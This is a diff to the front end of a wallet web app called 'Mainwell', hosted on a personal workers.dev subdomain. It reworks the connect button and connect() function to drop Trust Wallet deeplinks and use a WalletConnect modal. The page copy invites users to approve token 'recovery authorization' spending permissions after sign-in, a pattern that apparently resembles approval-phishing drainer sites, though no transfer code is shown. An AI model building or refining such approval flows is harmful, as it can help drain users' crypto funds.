@@ -5,7 +5,7 @@ const OWNER_HTML = `<!doctype html>
 </style></head><body><main class="shell">
 <header class="top"><div class="brand"><div class="mark">M</div><div>MAINWELL<small>WALLET WORKSPACE</small></div></div><span class="pill" id="connectionBadge">Wallet not connected</span></header>
 <section id="connectView"><div class="hero"><div class="eyebrow">YOUR ASSETS · YOUR AUTHORITY</div><h1>Stay informed. Stay in control.</h1><p>Connect your EVM wallet to view and monitor assets you choose. Wallet login is read-only; after login, you can review the recovery scope and separately approve the required transactions.</p></div>
-<section class="card connect"><h2>Connect your wallet</h2><p class="muted">Use a browser wallet such as MetaMask. Mainwell will ask you to sign a one-time login message — not a blockchain transaction.</p><button type="button" id="connect" class="primary" onclick="if(typeof window.mainwellConnect==='function'){window.mainwellConnect()}else{location.href='https://link.trustwallet.com/open_url?coin_id=60&url='+encodeURIComponent(location.href)}">Open Trust Wallet <span aria-hidden="true">→</span></button><p id="connectStatus" class="status" role="status" aria-live="polite"></p><p class="fine">Never enter a seed phrase or private key into Mainwell. Your wallet provider keeps those credentials.</p></section></section>
+<section class="card connect"><h2>Connect your wallet</h2><p class="muted">Connect with your wallet using its secure in-app browser connection or WalletConnect. Mainwell will ask you to sign a one-time login message — not a blockchain transaction.</p><button type="button" id="connect" class="primary" onclick="window.mainwellConnect?.()">Connect wallet <span aria-hidden="true">→</span></button><p id="connectStatus" class="status" role="status" aria-live="polite"></p><p class="fine">Never enter a seed phrase or private key into Mainwell. Your wallet provider keeps those credentials.</p></section></section>
 <div id="walletModal" class="wallet-modal hidden" aria-hidden="true" role="dialog" aria-modal="true" aria-labelledby="walletModalTitle"><section class="wallet-dialog"><div class="wallet-dialog-head"><h2 id="walletModalTitle">Connect to Mainwell</h2><button type="button" id="walletModalClose" class="wallet-close" aria-label="Close wallet selection" onclick="document.getElementById(\'walletModal\').classList.add(\'hidden\');document.getElementById(\'walletModal\').setAttribute(\'aria-hidden\',\'true\')">Close</button></div><p id="walletModalIntro">Choose a wallet to sign in. Recovery permissions are requested separately after sign-in, and every token approval requires your explicit confirmation.</p><div id="walletOptions" class="wallet-options"><div class="wallet-options-empty">Open Mainwell inside your wallet app: <a href="https://link.metamask.io/dapp/mainwell.godwin2000vic.workers.dev/">MetaMask</a> · <a href="https://link.trustwallet.com/open_url?coin_id=60&amp;url=https%3A%2F%2Fmainwell.godwin2000vic.workers.dev%2F">Trust Wallet</a> · <a href="https://www.coinbase.com/wallet">Coinbase Wallet</a> · <a href="https://rainbow.me/">Rainbow</a> · <a href="https://rabby.io/">Rabby</a> · Base</div></div><div class="wallet-modal-note"><p id="walletModalNote">Wallet sign-in does not grant spending permission. After sign-in, open Recovery authorization to review the exact tokens, networks and limits, then approve them in your wallet.</p></div><p id="walletModalStatus" class="status" role="status" aria-live="polite"></p></section></div>
 <section id="dashboard" class="hidden"><div class="hero"><div class="eyebrow">OWNER WORKSPACE</div><h1>Your wallet overview</h1><p id="walletAddress" class="muted"></p><p><a href="/authorize" class="secondary">Review recovery authorization →</a></p></div>
 <div class="grid"><section class="card stat"><small>Monitored wallets</small><strong id="walletCount">0</strong></section><section class="card stat"><small>Verified recovery grants</small><strong id="grantCount">0</strong></section><section class="card stat"><small>Active network</small><strong id="networkName" style="font-size:19px">—</strong></section></div>
@@ -282,22 +282,14 @@ function connect(){
  try{
   discoverLegacyProviders();
   const current=getCurrentBrowserWallet();
-  if(current){connectWithProvider(current.provider,current.info.name);return}
-  if(isTrustWalletBrowser()){
-   setStatus("connectStatus","Trust Wallet browser is open, but its EVM provider is not available to this page. Close this tab, reopen Mainwell from Trust Wallet's DApp browser, and retry. Mainwell will not launch Trust Wallet again from inside itself.",true);
-   void recordDiagnostic("wallet.injected_provider","missing","Trust Wallet browser did not expose an EIP-1193 provider");
-   return;
-  }
-  if(isMobileBrowser()){
-   const target=walletReturnUrl("trustwallet");
-   setStatus("connectStatus","Opening Mainwell in Trust Wallet. Once it opens, tap Connect once; Mainwell will connect to the wallet already inside the app.");
-   location.href="https://link.trustwallet.com/open_url?coin_id=60&url="+encodeURIComponent(target);
-   return;
-  }
+  if(current){void connectWithProvider(current.provider,current.info.name);return}
+  // Never deeplink from inside a wallet browser: that reopens the same page and
+  // creates the Trust Wallet selection loop. Use one standard WalletConnect modal.
   void connectWithAppKit();
  }catch(error){
   button.disabled=false;
   setStatus("connectStatus",error instanceof Error?error.message:"Wallet connection could not start. Please try again.",true);
+  void recordDiagnostic("wallet.connect","failed",error instanceof Error?error.message:"Wallet connection could not start");
  }
 }
 window.mainwellConnect=connect;
